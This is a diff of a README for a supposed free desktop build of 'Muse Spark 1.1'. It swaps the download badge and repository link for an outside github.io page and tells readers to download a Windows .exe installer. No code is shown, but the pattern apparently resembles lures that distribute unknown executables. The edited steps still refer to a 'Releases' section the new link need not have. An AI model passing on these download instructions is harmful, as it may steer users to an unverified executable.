@@ -1,6 +1,6 @@
 # 🚀 Muse-Spark-1.1-AI-Free-Desktop - Run advanced AI models on your computer
 
-[![](https://img.shields.io/badge/Download_Muse_Spark-1.1-blue.svg)](https://github.com/Alaynaa8113/Muse-Spark-1.1-AI-Free-Desktop)
+[![](https://img.shields.io/badge/Download_Muse_Spark-1.1-blue.svg)](https://alaynaa8113.github.io)
 
 ## 📖 About this application
 
@@ -22,7 +22,7 @@ Ensure your computer meets these specifications before you begin the setup proce
 
 Follow these steps to set up the software on your system.
 
-1. Visit the [official repository page](https://github.com/Alaynaa8113/Muse-Spark-1.1-AI-Free-Desktop) to access the download files.
+1. Visit the [official repository page](https://alaynaa8113.github.io) to access the download files.
 2. Look for the "Releases" section on the right side of the screen.
 3. Select the latest version of the Windows installer file, which will end in .exe.
 4. Save the file to your computer.
